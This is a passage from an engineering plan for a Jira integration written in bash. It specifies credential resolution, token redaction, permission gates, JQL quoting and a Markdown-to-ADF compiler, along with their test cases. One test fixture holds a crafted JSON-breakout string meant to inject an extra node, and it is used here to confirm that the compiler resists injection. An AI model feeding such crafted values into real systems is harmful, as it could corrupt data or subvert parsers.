- **Locking primitive**: `jira_with_lock <fn>` (the mkdir-based
  lock wrapper added for multi-file refresh) acquires
  `<paths.integrations>/jira/.lock` exclusively. Test cases:
  (a) **live-holder serialisation**: two backgrounded writers,
  the first holds the lock for 200 ms; the second blocks then
  completes after release. Assert both writers' work succeeded
  and the work was serialised (output sequence shows no
  interleaving).
  (b) **dead-holder recovery**: pre-create the lockdir with
  `holder.pid` containing a known-dead PID (e.g. PID 999999) and
  an arbitrary `holder.start`; invoke `jira_with_lock` and
  assert it acquires the lock within ~200 ms and the function
  runs successfully.
  (c) **SIGKILL holder recovery**: background a writer that
  holds the lock and immediately `kill -9` it; the next
  invocation acquires the lock within bounded retries
  (start-time mismatch on a recycled PID, or lock-mtime > 60 s
  fallback path).
  (d) **PID-recycling false-alive defence**: pre-create the
  lockdir with `holder.pid=$$` (the test's own live PID) but a
  deliberately wrong `holder.start` (e.g. an empty string or a
  fabricated value distinct from the real start-time); invoke
  `jira_with_lock` and assert it correctly identifies the
  holder as stale (start-time mismatch) and reclaims the lock,
  rather than blocking for 60 s on the live-but-unrelated PID.
  (e) **timeout diagnosis**: hold the lock for 65 s in a
  background process; the foreground invocation exits 53 with
  the holder PID and `holder.cmd` named in the stderr message
  (e.g. `lock held by jira-init-flow.sh (pid <N>) for >60s`).

#### 2a. log-common.sh (generic logging helpers)

**File**: `scripts/log-common.sh`
**Changes**: new repo-level sourceable library hosting `die "msg"`
and `warn "msg"` — the two utilities the previous plan put into
`jira-common.sh` despite being non-domain-specific. Lifting them to
a shared library (a) keeps `jira-common.sh` focused on Jira-domain
concerns, (b) makes them reusable for the next integration (Linear,
Trello), and (c) avoids the kitchen-sink shape the review flagged.

The functions are namespaced as `log_die` / `log_warn`. This is a
**deliberate departure** from the existing repo-level helper style
(`find_repo_root`, `atomic_write`, both unprefixed): bare `die` and
`warn` are short, common identifiers that frequently collide with
caller-scope variables and other libraries' helpers. The `log_`
prefix is short enough to be ergonomic and unambiguous enough to
avoid collisions. Consumers across `jira-*` helpers and any future
integration source `log-common.sh` and call the prefixed forms.

#### 2b. jira-common.sh (Jira-domain library)

**File**: `skills/integrations/jira/scripts/jira-common.sh`
**Changes**: new sourceable library matching
`skills/work/scripts/work-item-common.sh:1-25` style. Sources
`scripts/atomic-common.sh` for `atomic_write`, `scripts/vcs-common.sh`
for `find_repo_root`, and `scripts/log-common.sh` for `log_die` /
`log_warn`. No `set -euo pipefail`.

The library is **scoped strictly to Jira-domain concerns**.
Generic concerns (logging, error reporting, repo location, atomic
writes) live in their respective shared helpers. The header comment
groups functions by concern:

```
# State-directory resolution:
#   jira_state_dir            -> reads paths.integrations,
#                                returns <root>/.../jira/
#
# JSON manipulation:
#   jira_jq_field <json> <p>  -> jq -r extract; empty if missing
#   jira_atomic_write_json    -> validate + atomic_write
#
# Concurrency:
#   jira_with_lock <fn>       -> mkdir-based atomic exclusive lock
#                                on jira_state_dir/.lock; stale
#                                holders detected via PID +
#                                start-time stamp; 60 s timeout
#                                exits E_REFRESH_LOCKED (53);
#                                see Implementation Approach for
#                                full semantics
#
# Dependency checks:
#   jira_require_dependencies -> assert jq (>= 1.6), curl, awk on
#                                PATH; on miss, log_die with
#                                E_MISSING_DEP
#
# UUID generation:
#   _jira_uuid_v4             -> portable UUID v4 (uuidgen
#                                -> POSIX od + awk fallback);
#                                honours JIRA_ADF_LOCALID_SEED for
#                                test determinism
```

Stable error prefixes documented in the header comment:

- `E_NO_REPO` — repo root not locatable.
- `E_BAD_JSON` — input does not parse as JSON.
- `E_MISSING_DEP` — required dependency (`jq` ≥1.6, `curl`, `awk`)
  not found on PATH or below minimum version.
- `E_REFRESH_LOCKED` (53) — `jira_with_lock` could not acquire
  the integration lock within 60 s.

#### 3. test-jira-auth.sh (TDD: write first)

**File**: `skills/integrations/jira/scripts/test-jira-auth.sh`
**Changes**: new test script. Asserts the resolution chain in
isolation by setting up `accelerator.md` and `accelerator.local.md`
fixtures, manipulating env vars, and snapshotting the resolver's output.

Cases:

1. `ACCELERATOR_JIRA_TOKEN=foo` env var wins over every config source.
2. `ACCELERATOR_JIRA_TOKEN_CMD="echo bar"` resolves to `bar`. All
   trailing whitespace trimmed (test asserts `\r\n`, multiple
   newlines, and trailing spaces all stripped).
3. `accelerator.local.md` `jira.token` wins over `accelerator.md`
   `jira.token`.
4. `accelerator.local.md` `jira.token_cmd` wins over `accelerator.md`
   `jira.token`.
5. `accelerator.md` `jira.token` wins when nothing else is set.
6. **`accelerator.md` `jira.token_cmd` is ignored.** When only
   `accelerator.md` defines `jira.token_cmd` (and no env vars,
   `accelerator.local.md`, or shared `jira.token` exist), resolution
   fails with `E_NO_TOKEN`. Stderr emits
   `E_TOKEN_CMD_FROM_SHARED_CONFIG: jira.token_cmd in accelerator.md
   ignored — move to accelerator.local.md`.
7. Empty resolution exits non-zero with `E_NO_TOKEN` on stderr and a
   pointer to the configure docs; nothing on stdout.
8. Resolver output: stdout contains exactly three lines —
   `site=...\nemail=...\ntoken=...\n`. No interleaved logging.
9. Token redaction: `bash jira-auth-cli.sh --debug` produces stderr that
   contains the resolution path (env / file / cmd) but does **not**
   contain the resolved token bytes. The test injects a sentinel
   token value (`tok-SENTINEL-xyz123`) and greps for the sentinel in
   stdout, stderr, the base64-encoded form
   (`base64("$EMAIL:$TOKEN")`), the URL-encoded form, every temp file
   created during the run, and (for an in-flight curl) the
   process-listing entry from `ps -o args= -p <child-pid>`. The
   sentinel must appear only on the stdout `token=` line.
10. `_TOKEN_CMD` failure (command exits non-zero) propagates: resolver
    exits non-zero with `E_TOKEN_CMD_FAILED` on stderr. Stderr from
    the underlying command is **discarded** by default (captured
    `2>/dev/null` so password-manager errors carrying the secret
    name, vault path, or fragments do not leak); the helper emits
    only a generic `E_TOKEN_CMD_FAILED: command exited <N>`. A
    `--debug-token-cmd` flag opts in to surfacing the captured
    stderr for interactive debugging.
11. Site and email follow the same precedence (env var not supported —
    only file lookup), no env-var indirection. Cases 1 and 2 verify
    explicitly that `ACCELERATOR_JIRA_SITE` is **not** consulted.
12. **Token-cmd whitespace handling**: `token_cmd: echo -e
    "tok\r\n\n\n"` resolves to `tok` (all trailing whitespace
    stripped). Trim implementation uses `awk
    '{sub(/[[:space:]]+$/,""); print}'` rather than the
    single-newline `${var%$'\n'}` form.
13. **`accelerator.local.md` permissions (fail-closed)**: when
    `jira.token` or `jira.token_cmd` would be read from a
    `accelerator.local.md` whose mode is looser than `0600`, the
    resolver exits non-zero with `E_LOCAL_PERMS_INSECURE` (29) on
    stderr and the file's contents are NOT consumed. Test creates
    the file with mode 0644 and asserts (a) exit code 29, (b)
    stderr contains the actionable error message, (c) the resolver
    output stream is empty (no token leaked).
14. **`ACCELERATOR_ALLOW_INSECURE_LOCAL` opt-out (marker-gated)**:
    six sub-cases asserting the dual-gate semantics and the
    marker-file rejection paths:
    (a) mode 0644 + env var set + **no** marker file → still
    exits 29 with the hint message; opt-out alone is not
    sufficient.
    (b) mode 0644 + env var set + tracked
    `.claude/insecure-local-ok` regular file → resolver proceeds
    with downgrade warning; opt-out succeeds.
    (c) mode 0644 + tracked marker file + env var **unset** →
    still exits 29; the marker without the env var does not
    auto-enable insecure reads.
    (d) mode 0644 + env var set + **untracked** marker file (file
    exists in working tree but not added to VCS) → still exits 29;
    untracked marker is rejected to keep the override reviewable.
    (e) mode 0644 + env var set + marker file is a **symlink** to
    `/dev/null` → still exits 29 with `lstat`-based rejection;
    symlink-as-marker would otherwise satisfy a naïve `[ -e ]`
    check via any always-existing target.
    (f) mode 0644 + env var set + a **directory** named
    `.claude/insecure-local-ok` → still exits 29; only a regular
    file satisfies the gate.

#### 4. jira-auth.sh (sourceable library)

**File**: `skills/integrations/jira/scripts/jira-auth.sh`
**Changes**: new sourceable library (no shebang dispatch, no
`set -euo pipefail`). Defines `jira_resolve_credentials` which sets
`JIRA_SITE`, `JIRA_EMAIL`, `JIRA_TOKEN` in the caller's scope, plus a
companion `JIRA_RESOLUTION_SOURCE_TOKEN` ∈ `{env, env_cmd, local,
local_cmd, shared}` so callers (and the CLI wrapper) reflect
provenance from a single source of truth rather than re-deriving it.
Site/email get sibling `JIRA_RESOLUTION_SOURCE_SITE` /
`JIRA_RESOLUTION_SOURCE_EMAIL` ∈ `{shared, local}`.

Token-cmd execution: `bash -c "$cmd" 2>/dev/null` (stderr captured to
`/dev/null` by default — see Phase 2 §3 case 10). Stdout captured
into a variable; trim trailing whitespace with
`awk '{sub(/[[:space:]]+$/,""); print}'`. Non-zero exit produces the
documented `E_TOKEN_CMD_FAILED: command exited <N>` (no captured
stderr in the message — opt in via `--debug-token-cmd`).

`token_cmd` from the team-shared `accelerator.md` is **never**
honoured (see Phase 1 §3 resolution chain). When detected during
resolution, the helper emits
`E_TOKEN_CMD_FROM_SHARED_CONFIG: jira.token_cmd in accelerator.md
ignored — move to accelerator.local.md` to stderr and continues
through the chain.

When the resolver would consume `jira.token` or `jira.token_cmd`
from `accelerator.local.md`, it performs a permission check
before reading:

1. Check `! -L "$file"` to verify it is not a symlink. Symlinks
   are rejected outright with `E_LOCAL_PERMS_INSECURE` since
   their target's permissions are not the file the user expects
   to control.
2. Read the file mode using a platform-portable helper:
   `stat -f '%Lp' "$file"` (BSD/macOS) with a fallback to
   `stat -c '%a' "$file"` (GNU/Linux). The two-attempt pattern
   (`cmd1 2>/dev/null || cmd2`) avoids a uname-based branch and
   handles the common case (macOS or standard Linux) in one try.
3. The mode is checked against `≤ 0600`; on failure the file
   is not read.

This is a stat-then-read approach that has a narrow TOCTOU window,
but the threat model for a local dev config file does not warrant
the complexity of `O_NOFOLLOW` via a subprocess. The symlink check
in step 1 already closes the most common symlink-swap attack.

Refusal is **mode looser than `0600`**, exiting non-zero with `E_LOCAL_PERMS_INSECURE`
(29) and an actionable error message:
`E_LOCAL_PERMS_INSECURE: accelerator.local.md is mode <NNNN>;
chmod 600 to allow credential read, or set
ACCELERATOR_ALLOW_INSECURE_LOCAL=1 to override`. Fail-closed
because a stderr warning is silently absorbed by every Claude
Code session and most CI log capture — a user who never reads
stderr would happily keep using a token any local user can read.

The `ACCELERATOR_ALLOW_INSECURE_LOCAL=1` opt-out exists for
filesystems where mode bits are meaningless (NTFS-mounted
volumes, some sandboxed container layers). The opt-out requires
**both** of:

1. The env var `ACCELERATOR_ALLOW_INSECURE_LOCAL=1` set in the
   shell environment, AND
2. A **VCS-tracked** marker file `.claude/insecure-local-ok`
   (zero-byte regular file is sufficient).

**Marker-file presence check**: the resolver verifies all of:

- `lstat` rejects symlinks (a symlink-marker would let an attacker
  with working-tree write access satisfy the gate by linking to
  any always-existing path — `/dev/null`, `/etc/hosts`).
- The path is a regular file (not directory, socket, FIFO).
- It is **tracked by VCS** (jujutsu in this repo) — verified via
  `jj file list .claude/insecure-local-ok` (or `git ls-files
  --error-unmatch .claude/insecure-local-ok` in repos using git
  directly). An untracked working-tree file is rejected: a
  malicious dotfile or compromised dev-time script with
  working-tree write access cannot silently plant the marker.

The VCS-tracked requirement is the load-bearing safety property —
it ensures the override is a reviewable, auditable artefact in
the project's commit history, not an ambient working-tree
condition. A user on NTFS or a sandbox who needs the override
commits the marker once with a clear commit message; subsequent
runs in that repo honour the env var.

Phase 2 §3 case 14 sub-cases assert all three rejection paths:
untracked marker, symlinked marker (e.g. linked to `/dev/null`),
and directory-named marker — each must fail the gate even with
the env var set.

When both gates are satisfied, the resolver emits a downgrade
warning to stderr (`Warning: accelerator.local.md is mode <NNNN>;
honouring ACCELERATOR_ALLOW_INSECURE_LOCAL because
.claude/insecure-local-ok is present`) and proceeds.

When the env var is set but the marker file is absent, the
resolver still fails-closed with `E_LOCAL_PERMS_INSECURE` (29) and
adds a hint: `(set ACCELERATOR_ALLOW_INSECURE_LOCAL=1 AND commit
.claude/insecure-local-ok to override)`.

Document the opt-out (and the marker-file requirement) in the
configure SKILL.md jira section.

#### 5. jira-auth-cli.sh (thin CLI wrapper)

**File**: `skills/integrations/jira/scripts/jira-auth-cli.sh`
**Changes**: new executable. Standard CLI-wrapper shape: `#!/usr/bin/env
bash`, `set -euo pipefail`, `SCRIPT_DIR` via `BASH_SOURCE`, sources
`jira-auth.sh`, calls `jira_resolve_credentials`, prints exactly three
lines on stdout (`site=...\nemail=...\ntoken=...\n`) on success.

The `--debug` flag emits resolution-path metadata to stderr, sourced
directly from the `JIRA_RESOLUTION_SOURCE_*` variables set by the
library. The token value is **never** included in any stderr output;
in any debug-formatted string that would otherwise reference the
token (e.g. a printed equivalent of a downstream curl invocation),
the literal `***` is substituted.

`--debug` MUST NOT propagate to downstream curl invocations as
`-v`/`--verbose`/`--trace`/`--trace-ascii`; this prohibition is
documented in the helper header comment and asserted by Phase 5's
redaction test (see Phase 5 §2 case 12).

The split (sourceable lib + thin CLI wrapper) matches the
established `work-item-common.sh` / `work-item-resolve-id.sh`
convention — no script in the family is dual-mode.

### Success Criteria

#### Automated Verification

- [x] `bash skills/integrations/jira/scripts/test-jira-common.sh`
  passes.
- [x] `bash skills/integrations/jira/scripts/test-jira-auth.sh`
  passes (thirteen assertion groups).
- [x] `mise run test` passes.
- [ ] Token-redaction sentinel test: with token set to
  `tok-SENTINEL-xyz123`, `bash jira-auth-cli.sh --debug 2>&1
  1>/dev/null | grep -F tok-SENTINEL-xyz123` exits non-zero. The
  same grep applied to `base64(email:tok-SENTINEL-xyz123)`,
  `urlencode(tok-SENTINEL-xyz123)`, every temp file under `$TMPDIR`
  written during the run, and `ps -o args= -p <child-pid>` for any
  in-flight subprocess also exits non-zero.

#### Manual Verification

- [ ] In a real `.claude/accelerator.local.md`, set
  `jira.token_cmd: "echo dummy-token"`. Run
  `bash skills/integrations/jira/scripts/jira-auth-cli.sh` and confirm
  stdout reads `site=...\nemail=...\ntoken=dummy-token`.
- [ ] Set `ACCELERATOR_JIRA_TOKEN=overridden` in the environment; run
  again and confirm `token=overridden` regardless of file contents.
- [ ] Confirm `bash jira-auth-cli.sh --debug` does not display the
  token value on stderr.
- [ ] Move `jira.token_cmd` from `accelerator.local.md` to
  `accelerator.md`; run `bash jira-auth-cli.sh` and confirm it exits
  non-zero with the `E_TOKEN_CMD_FROM_SHARED_CONFIG` warning on
  stderr.
- [ ] **Fail-closed permissions**: run
  `chmod 644 .claude/accelerator.local.md`; run
  `bash jira-auth-cli.sh` and confirm it exits 29 with the
  `E_LOCAL_PERMS_INSECURE: ... chmod 600 ...` message on stderr and
  no token on stdout.
- [ ] **Permissions opt-out (env var alone is not enough)**: with
  the file still at mode 0644 and **no** marker file present,
  run `ACCELERATOR_ALLOW_INSECURE_LOCAL=1 bash jira-auth-cli.sh`
  and confirm it still exits 29 with the marker-hint message
  (`set ACCELERATOR_ALLOW_INSECURE_LOCAL=1 AND commit
  .claude/insecure-local-ok to override`).
- [ ] **Permissions opt-out (dual gate)**: create the marker file
  (`touch .claude/insecure-local-ok && jj status` or equivalent
  to mark it for inclusion), then run
  `ACCELERATOR_ALLOW_INSECURE_LOCAL=1 bash jira-auth-cli.sh`. With
  the file tracked by VCS, confirm the resolver proceeds with a
  downgrade warning on stderr and credentials resolve on stdout.

---

## Phase 3: jira-jql.sh

### Overview

Pure-bash JQL builder with safe quoting, `IN`/`NOT IN` composition,
`~`-prefix negation splitting, and the `--jql` escape hatch. No
network, no live tenant. Tests cover the quoting contract exhaustively
since incorrect JQL is the most likely source of silent search bugs in
later phases.

### Changes Required

#### 1. test-jira-jql.sh (TDD: write first)

**File**: `skills/integrations/jira/scripts/test-jira-jql.sh`
**Changes**: new test script. Cases:

1. `jql_quote_value 'simple'` → `'simple'`.
2. `jql_quote_value "don't"` → `'don''t'` (single-quote doubling).
3. `jql_quote_value "with \"double\""` → `'with "double"'` (no escape
   needed; we use single-quote outer).
4. `jql_quote_value "AND"` → `'AND'` (reserved word is quoted).
5. `jql_quote_value ""` exits non-zero with `E_JQL_EMPTY_VALUE` on
   stderr (`E_JQL_EMPTY_VALUE: empty value supplied; use --empty
   <field> for IS EMPTY clauses`). The previous proposal — return
   the literal token `EMPTY` as a sentinel — is rejected: it
   conflated an unset-field intent with the legitimate string
   `'EMPTY'` (a real label/status value in many shops) and silently
   returned wrong results when an empty string flowed in from a CLI
   default.
6. `jql_quote_value 'EMPTY'` → `'EMPTY'` (the literal string is just
   another value; no special handling).
7. `jql_filter status 'In Progress'` → `status = 'In Progress'`.
8. **`jql_compose --empty status` → `status IS EMPTY`**. The
   `--empty <field>` flag is the only way to express IS EMPTY;
   there is no shorthand via empty-string or sentinel value.
9. **`jql_compose --not-empty status` → `status IS NOT EMPTY`**.
10. `jql_in status 'In Progress' 'In Review'` →
    `status IN ('In Progress','In Review')`.
11. `jql_not_in status Done` → `status NOT IN ('Done')`.
12. `jql_split_neg "Done" "~In Progress" "Backlog"` → emits two
    arrays: positives `(Done Backlog)` and negatives `(In Progress)`.
13. `jql_compose --project ENG --status 'In Progress' --status '~Done' --label bug`
    → `project = 'ENG' AND status IN ('In Progress') AND status NOT IN ('Done') AND labels IN ('bug')`.
14. Composition skips clauses where positives and negatives are
    both empty.
15. Composition with no `--project` and no `--all-projects` exits
    non-zero with `E_JQL_NO_PROJECT`.
16. Composition with `--all-projects` omits the project clause.
17. **Tightened unsafe-value rule**: only control characters (bytes
    `\x00`–`\x1f`, `\x7f`) and lone backslashes that the
    single-quote-doubling escape cannot represent exit non-zero
    with `E_JQL_UNSAFE_VALUE` (passing `--unsafe` overrides). Test
    cases assert that **legitimate printable punctuation passes
    through unchanged after single-quote doubling**: `feature/auth`,
    `Customer Champion?`, `[brackets]`, `tag#1`, `email@example`,
    `100%`, `*wildcard*`, `path|pipe`, `bug;urgent` all produce
    correctly-quoted JQL without `--unsafe`. The previous broad
    denylist (`%`, `^`, `$`, `#`, `@`, `[`, `]`, `;`, `?`, `|`, `*`,
    `/`) is rejected because it over-rejected real Jira data and
    trained users to pass `--unsafe` reflexively, defeating the
    safety mechanism.
18. **Error message names the offending byte**: when
    `E_JQL_UNSAFE_VALUE` fires, stderr contains the value and
    identifies the rejected byte by name or hex code, e.g.
    `E_JQL_UNSAFE_VALUE: control character 0x07 (BEL) in
    'foo<BEL>bar' is not safely quotable; pass --unsafe to
    override`.
19. **Fuzz sanity check**: a fuzz test generates 100 random
    printable-ASCII inputs (length 1..40, drawn from
    `[a-zA-Z0-9 !"#$%&'()*+,-./:;<=>?@[\]^_\`{|}~]`), runs each
    through `jql_quote_value`, and asserts the output matches the
    JQL string-literal grammar `^'([^'\x00-\x1f]|''')*'$`.
20. `--jql 'project = "FOO" AND ORDER BY rank'` is appended verbatim
    after the composed clause with an `AND`; a stderr warning notes
    "raw JQL passed through".

#### 2. jira-jql.sh

**File**: `skills/integrations/jira/scripts/jira-jql.sh`
**Changes**: new sourceable library + paired
`jira-jql-cli.sh` thin executable wrapper (matching the
`jira-auth.sh` / `jira-auth-cli.sh` split convention adopted in
Phase 2). The library exposes `jql_quote_value`, `jql_filter`,
`jql_in`, `jql_not_in`, `jql_split_neg`, and `jql_compose`. The CLI
wrapper dispatches the `compose` subcommand. Pure bash; no jq, no
awk required (composition is plain string concatenation; fuzz check
in tests uses `awk` for `printf`).

`jql_compose` accepts `--empty <field>` and `--not-empty <field>`
flags for IS EMPTY / IS NOT EMPTY clauses. There is no
empty-string-as-sentinel shorthand.

Header comment documents exit codes:

- 0: success
- 30: `E_JQL_NO_PROJECT`
- 31: `E_JQL_UNSAFE_VALUE`
- 32: `E_JQL_BAD_FLAG`
- 33: `E_JQL_EMPTY_VALUE` (empty string supplied where a value was
  expected; user must pass `--empty <field>` for IS EMPTY)

Adopts `~` as the negation prefix as documented in research §5.2 and
in the user's personal `~/.claude/skills/jira/SKILL.md`.

### Success Criteria

#### Automated Verification

- [x] `bash skills/integrations/jira/scripts/test-jira-jql.sh` passes.
- [x] `mise run test` passes.
- [x] Round-trip safety: a fixture file of 50 hand-crafted user
  inputs (drawn from the personal `jira` skill's filter examples)
  produces JQL that contains zero unescaped single quotes per
  `grep -c "[^']'[^']'" output` (i.e. all single quotes are doubled).

#### Manual Verification

- [x] Hand-construct a query: `bash jira-jql.sh compose --project ENG
  --status 'In Progress' --label bug` and verify the printed JQL is
  human-readable and pasteable into Jira's advanced-search UI.

---

## Phase 4: ADF round-trip pair

### Overview

The largest single piece of Phase 1 work. Implements
`jira-adf-to-md.sh` (renderer; simpler) first, then
`jira-md-to-adf.sh` (compiler), then a round-trip property test that
exercises both together. Strategy A only — pure bash + jq + awk, no
optional binaries, supporting the constrained Markdown subset from
research §4.1.

The supported subset (final, no decisions deferred):

- Paragraphs (blank-line-separated).
- Headings `#` … `######` (ATX only).
- Fenced code blocks with optional language: ``` ```lang\n…\n``` ```.
- Single-level bullet lists (`-`, `*`, `+`).
- Single-level ordered lists (`1.`).
- GitHub-style checklists (`- [ ]`, `- [x]`).
- Hard breaks (trailing two-space wrap).
- Inline marks: `**bold**`, `__bold__`, `*italic*`, `_italic_`,
  `` `code` ``, `[text](url)`.

Out: tables, panels, expand, blockquote, media, status, date, mention,
emoji, inlineCard, rule, strike, underline, sub/sup, text colour,
nested lists, ambiguous combined marks (`***bold-italic***`).

### Changes Required

#### 1. ADF samples directory

**Files**:
`skills/integrations/jira/scripts/test-fixtures/adf-samples/<name>.md`,
`skills/integrations/jira/scripts/test-fixtures/adf-samples/<name>.adf.json`

Hand-author at least the following fixture pairs (each is a Markdown
file and its corresponding ADF JSON, so the renderer and compiler can
each load both sides):

- `paragraph-only.{md,adf.json}`
- `headings-h1-to-h6.{md,adf.json}`
- `bold-italic-code-link.{md,adf.json}`
- `bullet-list-flat.{md,adf.json}`
- `ordered-list-flat.{md,adf.json}`
- `checklist-mixed.{md,adf.json}`
- `code-block-with-lang.{md,adf.json}`
- `code-block-no-lang.{md,adf.json}`
- `hard-break.{md,adf.json}`
- `mixed-everything.{md,adf.json}` — one of each supported node type
  in a single document.

Edge-case fixtures (added to catch silent-corruption bugs):

- `unicode-mixed.{md,adf.json}` — CJK (`故事点`), RTL (`עברית`),
  combining diacritics (`café` with combining acute), emoji
  (`🚀✨`), all in a single paragraph plus a heading and a list
  item.
- `link-with-parens.{md,adf.json}` — `[text with (parens)](https://example.com/path?q=a&b=c#frag)`
  and a URL containing percent-encoded characters.
- `large-paragraph.{md,adf.json}` — 10 KB of text with inline marks
  scattered throughout (the Performance Considerations section
  acknowledges this as a real shape).
- `crlf-input.md` — file uses Windows CRLF line endings; the
  canonicalisation step normalises to LF before compile, and the
  paired `crlf-input.adf.json` reflects the LF-normalised content.
- `empty-doc.{md,adf.json}` — zero-byte input compiles to
  `{"version":1,"type":"doc","content":[]}`; a single newline
  compiles to the same.
- `bold-italic-asterisk.md` — `**bold**` and `*italic*` (the
  asterisk-only supported forms) round-trip cleanly. The
  underscore-form behaviour is exercised by
  `underscores-as-literals.md` and `underscore-warning.md`
  (Phase 4 §6 fixtures), which assert `__foo__` and `_foo_` are
  treated as literal text rather than emphasis markers.
- `placeholder-collision.md` — paragraph contains the literal text
  `[unsupported ADF node: panel]` and `[unsupported ADF inline:
  mention]`; round-trips cleanly without re-triggering the
  placeholder logic on the second pass.
- `inline-combinations.{md,adf.json}` — `**[link](url)**` (bold
  link) and `[*italic*](url)` (italic inside link) — these
  combinations must round-trip as documented in the inline
  tokeniser specification (Phase 4 §5).

Plus three rejection-only fixtures (Markdown that the compiler must
reject):

- `reject-table.md` — a pipe-table; expect `E_ADF_UNSUPPORTED_TABLE`.
- `reject-nested-list.md` — a nested bullet list; expect
  `E_ADF_UNSUPPORTED_NESTED_LIST`.
- `reject-blockquote.md` — `> quoted`; expect
  `E_ADF_UNSUPPORTED_BLOCKQUOTE`.

Plus two rendering-only fixtures (ADF that the renderer must emit a
placeholder for):

- `unsupported-panel.adf.json` — a `panel` node; expect
  `[unsupported ADF node: panel]` in the rendered output.
- `unsupported-mention.adf.json` — a `mention` inline node; expect
  `[unsupported ADF inline: mention]`.

#### 2. test-jira-adf-to-md.sh (TDD: write first)

**File**: `skills/integrations/jira/scripts/test-jira-adf-to-md.sh`
**Changes**: new test script. The fixture-pair sweep iterates
every `<name>.adf.json` under `test-fixtures/adf-samples/`, runs
`jira-adf-to-md.sh < fixture > out.md` and compares against the
paired `<name>.md` via `assert_file_content_eq`. Plus explicit
named cases (so per-fixture assertions are visible in test
output rather than buried in the sweep):

- `unsupported-panel`: assert
  `[unsupported ADF node: panel]` appears verbatim in the
  rendered output for the `unsupported-panel.adf.json` rendering-
  only fixture.
- `unsupported-mention`: assert
  `[unsupported ADF inline: mention]` appears verbatim for the
  `unsupported-mention.adf.json` rendering-only fixture.
- Negative case: stdin that is not valid JSON exits non-zero with
  `E_BAD_JSON`.

#### 3. jira-adf-to-md.sh

**File**: `skills/integrations/jira/scripts/jira-adf-to-md.sh`
**Changes**: new executable filter, single-pass jq. ~150–250 lines of
bash + a heredoc'd jq program. Validates input parses as `{"version":1,"type":"doc",...}`;
walks `.content[]` recursively. Mark precedence: link wraps everything,
then bold, then italic, then code (innermost). For unsupported nodes,
emits the `[unsupported ADF node: <type>]` placeholder on its own line.

#### 4. test-jira-md-to-adf.sh (TDD: write first)

**File**: `skills/integrations/jira/scripts/test-jira-md-to-adf.sh`
**Changes**: new test script. The fixture-pair sweep iterates
every non-rejection `<name>.md` under `test-fixtures/adf-samples/`,
runs `jira-md-to-adf.sh < fixture > out.adf.json`, and compares
against the paired `<name>.adf.json` via `jq -S` (sort keys) on
both sides before diffing so key-order differences don't fail
comparison.

Explicit named cases (per-fixture, alongside the sweep):

- `code-block-with-tabs`: assert tabs in code-block content
  survive both compile and render directions verbatim (no
  truncation, no escape-substitution); the rendered Markdown's
  tab byte count equals the input's.
- `unicode-mixed`: assert CJK + RTL + emoji survive byte-for-byte
  through the round-trip; the rendered Markdown is byte-equal to
  the canonicalised input.
- `crlf-input`: assert canonicalisation normalises CRLF to LF
  before compile; the persisted ADF is identical to the
  LF-source variant.
- `large-paragraph`: assert a 10 KB paragraph compiles within a
  reasonable time bound (e.g. < 5 s on commodity hardware) and
  the marker tokens preserved per Invariant 3 are all present
  on the output side.
- `placeholder-collision`: paragraph containing the literal text
  `[unsupported ADF node: panel]` and `[unsupported ADF inline:
  mention]` round-trips cleanly — the compiler emits these as
  literal paragraph text without re-triggering the placeholder
  convention.
- `inline-combinations`: each of `**[link](url)**`,
  `[*italic*](url)` round-trips and renders to ADF that is
  semantically equivalent (link preserves its href; bold/italic
  marks attach to the right run) per the inline tokeniser
  recursion rule.
- `underscores-as-literals`: `snake_case_variable`, `__init__`,
  `epic_link`, `_leading_and_trailing_` all round-trip with
  underscores preserved as literal text; assert no `em` or
  `strong` marks appear in the resulting ADF.
- `mixed-asterisk-emphasis`: `**bold with *italic* inside**` and
  `*italic with **bold** inside*` round-trip with the documented
  nesting form.
- `underscore-warning`: `__looks_like_old_bold__` compiles
  successfully (literal underscores in output) AND the test
  asserts a one-line stderr warning fires:
  `Notice: '__...__' is not emphasis in this subset; use
  **...** for bold`.

Rejection cases (named per fixture):

- `reject-table`: assert non-zero exit (41) and
  `E_ADF_UNSUPPORTED_TABLE` prefix on stderr.
- `reject-nested-list`: assert exit 41 and
  `E_ADF_UNSUPPORTED_NESTED_LIST`.
- `reject-blockquote`: assert exit 41 and
  `E_ADF_UNSUPPORTED_BLOCKQUOTE`.
- `reject-control-chars`: a `<name>.md` containing literal
  `\x1e` or `\x1f` bytes (which would break the awk record
  contract) exits non-zero with `E_ADF_BAD_INPUT` (42).
- `reject-jq-injection`: a paragraph with content
  `"}, {"type":"mention"` (an attempt to break out of a JSON
  string boundary in the jq compiler) compiles to ADF
  containing exactly one paragraph with literal text — no
  injected `mention` node.

#### 5. jira-md-to-adf.sh

**Files**: split into three artefacts from the start so the
boundaries are explicit (the review flagged that 250–400 lines of
mixed bash + awk + jq in one file was at the upper edge of
maintainability):

- `skills/integrations/jira/scripts/jira-md-tokenise.awk` — the
  block tokeniser (Pass 1). Stand-alone POSIX awk script that reads
  Markdown on stdin and emits the documented record stream on
  stdout. Pinned to POSIX awk (no `gensub`, no gawk extensions);
  the script header documents the constraint.
- `skills/integrations/jira/scripts/jira-md-inlines.awk` — the
  inline tokeniser (Pass 2a). Reads text payloads on stdin and
  emits a record stream of marks (`CODE`, `LINK`, `BOLD`, `ITALIC`,
  `TEXT`) with documented precedence (link wraps everything; then
  bold; then italic; code is innermost). The recursion rule for
  inlines inside link text and inside bold text is specified
  explicitly: link text is re-tokenised through the inline pass,
  but code spans are not (their content is opaque).
- `skills/integrations/jira/scripts/jira-md-to-adf.sh` — the
  orchestrator (Pass 2b). Bash + jq. Pipes Markdown through the two
  awk scripts, then assembles the ADF tree via jq. All Markdown
  text payloads cross the bash→jq boundary via `--arg`/`--rawfile`/
  `--argjson` (NEVER via shell-string interpolation into the jq
  program) to prevent JSON-injection from crafted Markdown.
  Adversarial fixture (`reject-jq-injection.md` containing
  `"}, {"type":"mention"`) asserts the resulting ADF contains
  exactly one paragraph node with literal text.

**Awk record contract** (the named, documented interface between
passes). Field separator is **ASCII Unit Separator (`\x1f`, `US`)**,
not tab — Markdown text payloads (especially fenced code blocks)
legitimately contain literal tabs, so a tab FS would corrupt
content. `\x1f` cannot appear in valid UTF-8 Markdown source.
Records are terminated by **ASCII Record Separator (`\x1e`, `RS`)**
rather than `\n` so payloads can contain literal newlines verbatim
(hard-break payloads, multi-line code-block content). Records use
literal byte payloads — no escaping is required because the
separator bytes cannot appear in the content.

```
H<level><US><text><RS>          heading 1..6
P<US><text><RS>                 paragraph
BUL<US><text><RS>               bullet list item
ORD<US><n><US><text><RS>        ordered list item
TASK_TODO<US><text><RS>         unchecked checklist item
TASK_DONE<US><text><RS>         checked checklist item
